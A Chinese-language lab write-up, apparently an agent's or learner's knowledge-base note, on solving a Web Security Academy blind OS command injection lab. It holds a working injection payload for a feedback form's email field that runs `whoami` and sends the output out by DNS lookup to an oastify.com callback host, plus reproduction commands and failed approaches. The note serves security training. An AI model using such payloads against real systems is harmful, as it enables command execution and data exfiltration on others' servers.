---
title: "lab-blind-out-of-band-data-exfiltration"
links:
  - target: oob-callback-family
    relation: evidences
  - target: blind-injection-family
    relation: evidences
  - target: burp-collaborator-public-polling-method
    relation: evidences
  - target: records/lab-blind-out-of-band
    relation: links-to
---

# lab-blind-out-of-band-data-exfiltration

> evidences: [[oob-callback-family]], [[blind-injection-family]], [[burp-collaborator-public-polling-method]]

- 题面:Blind OS command injection with out-of-band data exfiltration(/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)
- 实例(批 53):https://0a0900360419601c803a260e00d9003a.web-security-academy.net
- 判定目标:执行 `whoami` 并经 DNS 外带,再用 `Submit solution` 提交用户名;**solved**

## 关键分水岭:检测型 vs 外传型

- 同一注入面(四字段 `/feedback/submit`,异步无回显),但判定多一步"提交用户名"。
- 只把回调打向**随机** `*.oastify.com` 子域:注入确实执行了,横幅 **不翻**(实测 `solved=false`)——判定需要正确答案,不是"有 interaction 就行"。
- 正解 = **自持 secret 派生标签**后轮询读回交互(见 [[burp-collaborator-public-polling-method]]):
  `x@a.com||nslookup $(whoami).<label>.oastify.com||` → poll → `peter-9ebGxU.<label>.oastify.com`。

## 走过的死路(不要重走)

- **输出重定向到 web 目录**:`whoami>static/x.txt; whoami>./x.txt; whoami>public/x.txt; whoami>/var/www/html/x.txt`
  再取 `/static/x.txt`、`/x.txt`、`/public/x.txt` → 全 404(题面亦明说不可)。app 自身响应面不给写口。
- **`/submitSolution` 当盲猜预言机**:返回 `{"correct":false}`(可判对错),但用户名是 `peter-<5位随机>` ⇒ 不可爆破。

## 复现命令

```
burp_collab new --custom os                            # 给出 <label> 与 host
http_session post "<inst>/feedback/submit" --jar /tmp/b53-jar2.json --form csrf=<csrf> \
  --form name=t --form "email=x@a.com||nslookup $(whoami).<label>.oastify.com||" --form subject=s --form message=m
burp_collab poll                                       # sub_domain 首标签 = whoami
http_dump "<inst>/submitSolution" --method POST --header 'Content-Type: application/x-www-form-urlencoded' \
  --body 'answer=peter-9ebGxU' --jar /tmp/b53-jar2.json    # {"correct":true}
```
